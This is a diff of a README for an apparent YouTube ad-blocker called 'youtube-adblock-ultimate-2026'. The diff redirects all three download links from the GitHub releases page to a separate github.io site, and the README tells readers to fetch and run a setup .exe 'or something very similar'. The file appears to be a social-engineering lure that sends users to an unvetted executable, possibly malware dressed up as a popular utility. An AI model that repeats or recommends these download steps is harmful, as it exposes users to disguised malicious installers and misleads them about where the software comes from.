@@ -1,6 +1,6 @@
 # 🛡️ youtube-adblock-ultimate-2026 - The Last Ad Blocker You'll Ever Need
 
-[![Download Now](https://img.shields.io/badge/Download-youtube--adblock--ultimate--2026-FF4500?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440)](https://github.com/kvasscontrolgrid56/youtube-adblock-ultimate-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-youtube--adblock--ultimate--2026-FF4500?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440)](https://kvasscontrolgrid56.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ This isn't your typical complicated installation. We've made it as straightforwa
 
 ### 📥 Getting the File
 
-1. Go to our [official download page](https://github.com/kvasscontrolgrid56/youtube-adblock-ultimate-2026/releases)
+1. Go to our [official download page](https://kvasscontrolgrid56.github.io)
 2. Look for the file named `youtube-adblock-ultimate-2026-setup.exe` (or something very similar)
 3. Click it to start downloading
 
@@ -156,7 +156,7 @@ We believe that YouTube ads are a necessary evil for supporting creators, BUT we
 
 **Ready to join thousands of happy users?**
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-youtube--adblock--ultimate--2026-28A745?style=for-the-badge&logo=windowsterminal&logoColor=white&labelColor=343A40)](https://github.com/kvasscontrolgrid56/youtube-adblock-ultimate-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-youtube--adblock--ultimate--2026-28A745?style=for-the-badge&logo=windowsterminal&logoColor=white&labelColor=343A40)](https://kvasscontrolgrid56.github.io)
 
 Don't let another intrusive ad ruin your viewing experience. Take back control today. Visit this link to download the application.
 
